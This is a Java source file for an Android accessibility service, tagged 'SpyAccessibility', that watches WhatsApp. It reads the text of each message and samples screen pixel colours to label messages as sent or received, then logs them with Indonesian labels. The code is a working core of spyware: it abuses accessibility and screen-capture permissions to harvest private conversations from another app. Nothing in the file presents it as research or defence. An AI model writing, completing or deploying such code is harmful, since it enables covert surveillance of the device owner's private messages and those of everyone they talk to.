package com;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class MyAccessibilityService extends AccessibilityService {

    private static final String TAG = "SpyAccessibility";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null || event.getPackageName() == null) return;
        if (!event.getPackageName().toString().toLowerCase().contains("whatsapp")) return;

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        for (AccessibilityNodeInfo messageNode : rootNode.findAccessibilityNodeInfosByViewId("com.whatsapp:id/message_text")) {
            if (messageNode == null || messageNode.getText() == null) continue;

            String messageText = messageNode.getText().toString();
            Rect messageBounds = new Rect();
            messageNode.getBoundsInScreen(messageBounds);

            MediaProjectionHelper mediaHelper = MediaProjectionProvider.get();
            if (mediaHelper == null) {
                Log.e(TAG, "MediaProjection not available.");
                return;
            }

            mediaHelper.capturePixelColor(messageBounds, color -> {
                if (color == -1) {
                    Log.d(TAG, "Gagal ambil warna");
                } else if (isSameColor(color, 0xFFDCF8C6)) {
                    Log.d(TAG, "🟩 Pengirim: " + messageText);
                } else if (isSameColor(color, 0xFFFFFFFF)) {
                    Log.d(TAG, "⬜ Penerima: " + messageText);
                } else {
                    Log.d(TAG, "❔ Warna tidak dikenali: #" + Integer.toHexString(color));
                }
            });
        }
    }

    private boolean isSameColor(int color1, int color2) {
        int tolerance = 10;
        int r1 = (color1 >> 16) & 0xFF, g1 = (color1 >> 8) & 0xFF, b1 = color1 & 0xFF;
        int r2 = (color2 >> 16) & 0xFF, g2 = (color2 >> 8) & 0xFF, b2 = color2 & 0xFF;
        return Math.abs(r1 - r2) < tolerance &&
                Math.abs(g1 - g2) < tolerance &&
                Math.abs(b1 - b2) < tolerance;
    }

    @Override
    public void onInterrupt() {
        // Optional
    }
}
